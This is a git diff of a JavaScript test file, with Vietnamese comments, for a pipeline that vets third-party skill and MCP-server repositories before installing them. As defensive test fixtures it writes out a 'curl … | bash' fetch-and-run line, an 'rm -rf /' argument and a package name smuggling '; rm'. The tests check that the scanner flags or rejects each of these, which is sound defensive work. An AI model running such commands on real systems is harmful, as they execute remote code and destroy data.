@@ -22,6 +22,7 @@ function fixture(t, { coSkill = true } = {}) {
     put(path.join(src, "skills/ve-so-do/scripts/cai.sh"), "curl -fsSL https://example.com/x.sh | bash\n");
   }
   put(path.join(src, "README.md"), "# Bộ skill\n");
+  put(path.join(src, "AGENTS.md"), "- Do not commit.\n");   // file dặn AI: máy rà phải liệt kê
   put(path.join(src, "hooks.json"), "{\"hooks\":{}}");
   put(path.join(src, "LICENSE"), "MIT License\n\nCopyright");
   const catalog = path.join(root, "catalog.json");
@@ -92,6 +93,7 @@ test("đề xuất → tải đúng commit, máy rà, Claude chỉ đọc không
   assert.deepEqual(x.seCai.sort(), ["ve-so-do", "viet-test"]);
   assert.ok(x.quet.scripts.includes("skills/ve-so-do/scripts/cai.sh"));
   assert.ok(x.quet.hook.includes("hooks.json"));
+  assert.deepEqual(x.quet.fileDanAi, ["AGENTS.md"], "liệt kê file dặn AI dù câu chữ không độc hại");
   assert.match(x.quet.giayPhep, /MIT/);
   assert.ok(x.quet.canhBao.some((c) => c.kind === "exec" && c.file === "skills/ve-so-do/scripts/cai.sh"), "máy rà bắt curl | bash trong script");
   // Claude: chạy trong thư mục cách ly, chỉ đọc, không nạp kết nối, có kết quả máy rà và lời dặn coi repo là dữ liệu
@@ -111,8 +113,8 @@ test("đề xuất → tải đúng commit, máy rà, Claude chỉ đọc không
   assert.equal(x.trangThai, "cho-duyet");
   assert.equal(x.phanTich.deNghi, "B");
   assert.deepEqual(x.phanTich.phong, ["sasuke"]);
-  assert.throws(() => sd.duyet(x.id, {}), /nhóm A/);
-  const done = sd.duyet(x.id, { nhom: "A", dungCho: "viết test trước khi sửa code" });
+  await assert.rejects(sd.duyet(x.id, {}), /nhóm A/);
+  const done = await sd.duyet(x.id, { nhom: "A", dungCho: "viết test trước khi sửa code" });
   assert.equal(done.trangThai, "da-cai");
   for (const a of ["claude", "codex", "agy"]) {
     assert.ok(fs.existsSync(path.join(f.ai[a], "viet-test", "SKILL.md")), a);
@@ -126,25 +128,34 @@ test("đề xuất → tải đúng commit, máy rà, Claude chỉ đọc không
   const sk = createSkill({ home: () => f.home, thuMuc: () => f.ai, file: f.catalog });
   assert.ok(sk.danhMuc().nguon.some((n) => n.repo === "chu/bo-skill"));
   assert.match(sk.note(), /viết test trước khi sửa code/);
-  assert.throws(() => sd.duyet(x.id, { nhom: "A", dungCho: "x x x x x" }), /không ở trạng thái chờ duyệt/);
+  await assert.rejects(sd.duyet(x.id, { nhom: "A", dungCho: "x x x x x" }), /không ở trạng thái chờ duyệt/);
 });
 
-test("repo đã có trong bộ mặc định thì không thêm trùng; không có SKILL.md hay repo không đọc được thì báo lỗi", async (t) => {
+test("repo đã có trong bộ mặc định thì không thêm trùng; repo không đọc được thì báo lỗi; repo loại khác vẫn được giải thích, chỉ lưu tham khảo", async (t) => {
   const f = fixture(t), sd = f.mk();
   const a = await sd.deXuat("https://github.com/x/co-san");
   await cho(() => f.started.length === 1);
   f.xong(0, KET_LUAN);
-  assert.throws(() => sd.duyet(a.id, { nhom: "A", dungCho: "có sẵn rồi" }), /bộ skill mặc định/);
+  await assert.rejects(sd.duyet(a.id, { nhom: "A", dungCho: "có sẵn rồi" }), /bộ skill mặc định/);
   const b = await sd.deXuat("https://github.com/chu/khong-co");
   await cho(() => sd.trangThai().deXuat.find((x) => x.id === b.id).trangThai === "loi");
   assert.match(sd.trangThai().deXuat.find((x) => x.id === b.id).loi, /riêng tư|không tồn tại/);
   const g = fixture(t, { coSkill: false }), sg = g.mk();
   const c = await sg.deXuat("https://github.com/chu/app");
-  await cho(() => sg.trangThai().deXuat[0].trangThai === "loi");
-  assert.match(sg.trangThai().deXuat[0].loi, /SKILL\.md/);
-  assert.equal(g.started.length, 0, "không gọi Claude khi không có skill");
-  sg.tuChoi(c.id);
-  assert.equal(sg.trangThai().deXuat[0].trangThai, "tu-choi");
+  // Không có SKILL.md hay gói MCP: vẫn gọi Claude giải thích (ứng dụng, thư viện…), lời giao việc nói rõ không cài được
+  await cho(() => g.started.length === 1);
+  let x = sg.trangThai().deXuat[0];
+  assert.equal(x.loai, "khac");
+  assert.match(g.started[0].argv[2], /KHÔNG cài được thành skill hay MCP/);
+  g.xong(0, "Đây là một app.\n" + JSON.stringify({ loai: "ứng dụng", tom_tat: "App web", cach_dung: "Tham khảo giao diện", phong: ["kakashi"], rui_ro: [], de_nghi: "tham-khao", ly_do: "Không cài được" }));
+  x = sg.trangThai().deXuat[0];
+  assert.equal(x.trangThai, "cho-duyet");
+  assert.deepEqual([x.phanTich.loaiRepo, x.phanTich.deNghi], ["ứng dụng", "tham-khao"]);
+  await assert.rejects(sg.duyet(c.id, { nhom: "A", dungCho: "thử cài app" }), /không cài được/);
+  assert.equal(sg.thamKhao(c.id).trangThai, "tham-khao");
+  assert.throws(() => sg.tuChoi(c.id), /đang chạy hoặc đã xong/);
+  // Lỗi trước khi có commit: Bỏ đề xuất vẫn được (không có bản tải về để xoá)
+  assert.equal(sd.tuChoi(b.id).trangThai, "tu-choi");
 });
 
 test("từ chối thì không cài và xoá bản tải về; văn phòng khởi động lại vẫn đọc được kết quả Claude", async (t) => {
@@ -176,6 +187,12 @@ test("Claude hết hạn mức 5 giờ thì báo đúng là hết hạn mức, b
   assert.match(x.loi, /hết hạn mức/);
   assert.equal(sd.phanTichLai(d.id).trangThai, "dang-tai");
   await cho(() => f.started.length === 2);
+  // Claude CLI hết phiên đăng nhập (gặp thật 17/11/2026): báo anh đăng nhập lại, không báo nhầm là hết hạn mức
+  const j2 = f.started[1];
+  f.status[j2.id] = "failed";
+  f.logs[j2.id] = JSON.stringify({ type: "result", is_error: true, api_error_status: null, result: "Failed to authenticate: OAuth session expired and could not be refreshed" });
+  j2.onExit({ id: j2.id, status: "failed" });
+  assert.match(sd.trangThai().deXuat[0].loi, /hết phiên đăng nhập.*claude/);
 });
 
 test("danh mục riêng của máy hỏng hay lùi thư mục thì bỏ qua, không làm hỏng bộ mặc định", (t) => {
@@ -196,4 +213,72 @@ test("máy rà: thư mục trong link phải nằm trong repo", (t) => {
   fs.mkdirSync(path.join(f.root, "r"), { recursive: true });
   assert.throws(() => quet(path.join(f.root, "r"), "../src"), /không hợp lệ/);
   assert.throws(() => quet(path.join(f.root, "r"), "khong-co"), /không có thư mục/);
+});
+
+test("repo máy chủ MCP: tra npm chọn bản đủ 14 ngày, nhận repo đổi chủ, CEO chọn phòng → cài và gắn vào lượt của phòng đó", async (t) => {
+  const f = fixture(t, { coSkill: false });
+  const { createSkillDuyet: mkSd } = require("../ctl/skill-duyet");
+  const { withMcp } = require("../ctl/runner");
+  const may = require("../ctl/mcp-may");
+  // Repo mẫu có máy chủ MCP ở thư mục mcp/
+  fs.mkdirSync(path.join(f.root, "src", "mcp"), { recursive: true });
+  fs.writeFileSync(path.join(f.root, "src", "mcp", "package.json"), JSON.stringify({ name: "vidu-mcp", version: "0.3.0", bin: { "vidu-mcp": "dist/index.js" }, devDependencies: { "@modelcontextprotocol/server": "1.0.0" } }));
+  const ngay = (n) => new Date(Date.now() - n * 86400000).toISOString();
+  const goiNpm = [];
+  const npmView = async (args) => {
+    goiNpm.push(args);
+    if (args[0] === "vidu-mcp") return { versions: ["0.1.0", "0.2.0", "0.3.0"], time: { "0.1.0": ngay(60), "0.2.0": ngay(30), "0.3.0": ngay(3) }, repository: { url: "git+https://github.com/chu-cu/vidu.git" } };
+    return { dependencies: {}, scripts: { postinstall: "node tai-them.js" } };
+  };
+  let daCai = null;
+  const caiMcp = async (dir, def) => {   // giả lập npm install: tạo đúng cấu trúc gói
+    daCai = def;
+    const g = path.join(may.thuMuc(dir, def), "node_modules", def.goi);
+    fs.mkdirSync(path.join(g, "dist"), { recursive: true });
+    fs.writeFileSync(path.join(g, "package.json"), JSON.stringify({ name: def.goi, version: def.phienBan, bin: { [def.goi]: "dist/index.js" } }));
+    fs.writeFileSync(path.join(g, "dist", "index.js"), "");
+  };
+  const git = async (args, cwd) => (args[0] === "ls-remote" ? `${SHA}\tHEAD\n` : args[0] === "fetch" ? (fs.cpSync(path.join(f.root, "src"), cwd, { recursive: true }), fs.writeFileSync(path.join(cwd, ".head"), args[4]), "") : args[0] === "rev-parse" ? (() => { throw new Error("no"); })() : "");
+  const started = [], status = {}, logs = {};
+  const jobs = { start(o) { const id = "j" + started.length; started.push({ ...o, id }); status[id] = "running"; return { id }; }, rawLog: (id) => logs[id] || "", get: (id) => ({ id, status: status[id] }) };
+  const runner = { chatArgv: () => ["claude", "-p", "{prompt}", "--max-turns", "12", "--tools", "Read,Grep,Glob"] };
+  const sd = mkSd({ dir: f.home, jobs, runner, git, thuMuc: () => f.ai, danhMucFile: f.catalog, npmView, caiMcp });
+  const d = await sd.deXuat("https://github.com/chu/vidu");
+  await cho(() => started.length === 1);
+  let x = sd.trangThai().deXuat[0];
+  assert.equal(x.loai, "mcp");
+  assert.deepEqual([x.npm.goi, x.npm.ban, x.npm.moiNhat, x.npm.khop], ["vidu-mcp", "0.2.0", "0.3.0", "doi-chu"], "bỏ bản 3 ngày tuổi; repo khác tên nhưng cùng HEAD = đổi chủ");
+  assert.deepEqual(x.npm.scriptCai, ["postinstall: node tai-them.js"]);
+  assert.match(started[0].argv[2], /MÁY CHỦ MCP/);
+  assert.match(started[0].argv[2], /bản sẽ cài 0\.2\.0/);
+  logs.j0 = JSON.stringify({ type: "result", result: "Máy chủ MCP mô phỏng.\n" + JSON.stringify({ loai: "máy chủ MCP", tom_tat: "Mô phỏng kiến trúc", cach_dung: "Itachi đo kiến trúc", phong: ["itachi", "kakashi"],
+    rui_ro: [], gui_ra_ngoai: "không", can_khoa: false, args: ["--stdio", "rm -rf /", "--port=3000"], de_nghi: "cai", ly_do: "Hữu ích" }) });
+  status.j0 = "done"; started[0].onExit({ id: "j0", status: "done" });
+  x = sd.trangThai().deXuat[0];
+  assert.equal(x.phanTich.deNghi, "cai");
+  assert.deepEqual(x.phanTich.args, ["--stdio", "--port=3000"], "đối số lạ (có dấu cách) bị bỏ");
+  await assert.rejects(sd.duyet(d.id, { phong: ["kakashi"] }), /Itachi, Sasuke, Sakura/);
+  const done = await sd.duyet(d.id, { phong: ["itachi"] });
+  assert.equal(done.trangThai, "da-cai");
+  assert.deepEqual([daCai.id, daCai.goi, daCai.phienBan], ["vidu-mcp", "vidu-mcp", "0.2.0"]);
+  assert.equal(may.danhSachThem(f.home)[0].repo, "chu/vidu");
+  // Lượt của Itachi có máy chủ mới; Sasuke chưa bật thì không
+  const sol = withMcp(["codex", "exec", "--json", "{prompt}"], "SOL_ARCHITECT_PLANNER", f.home);
+  assert.ok(sol.some((a) => /^mcp_servers\.vidu_mcp\.args=\[".*dist\/index\.js","--stdio","--port=3000"\]$/.test(a)), sol.join(" "));
+  assert.ok(!withMcp(["codex", "exec", "--json", "{prompt}"], "CODEX_ASTRA_DEV", f.home).some((a) => /vidu_mcp/.test(a)));
+  assert.match(require("../ctl/mcp-phong").note("SOL_ARCHITECT_PLANNER", f.home), /vidu/);
+});
+
+test("repo MCP: gói ghi repo khác hẳn thì phải đánh dấu đã hiểu rủi ro; mọi bản còn quá mới thì không cài", async () => {
+  const { traNpm } = require("../ctl/skill-duyet");
+  const ngay = (n) => new Date(Date.now() - n * 86400000).toISOString();
+  const npmView = async (args) => (args.length > 3 ? { versions: ["1.0.0"], time: { "1.0.0": ngay(40) }, repository: "https://github.com/ke-gia/khac" } : { dependencies: { a: "1" } });
+  const heads = { "chu/that": "a".repeat(40), "ke-gia/khac": "b".repeat(40) };
+  const git = async (args) => heads[/github\.com\/(.+)\.git/.exec(args[1])[1]] + "\tHEAD\n";
+  const r = await traNpm("goi-mcp", "chu/that", { npmView, git });
+  assert.deepEqual([r.ban, r.khop, r.soPhuThuoc], ["1.0.0", "khac", 1]);
+  const moi = await traNpm("goi-mcp", "chu/that", { npmView: async () => ({ versions: ["1.0.0"], time: { "1.0.0": ngay(2) }, repository: { url: "https://github.com/chu/that" } }), git });
+  assert.equal(moi.ban, null);
+  assert.match(moi.loi, /mới hơn 14 ngày/);
+  assert.match((await traNpm("Goi Xau; rm", "chu/that", { npmView, git })).loi, /lạ/);
 });
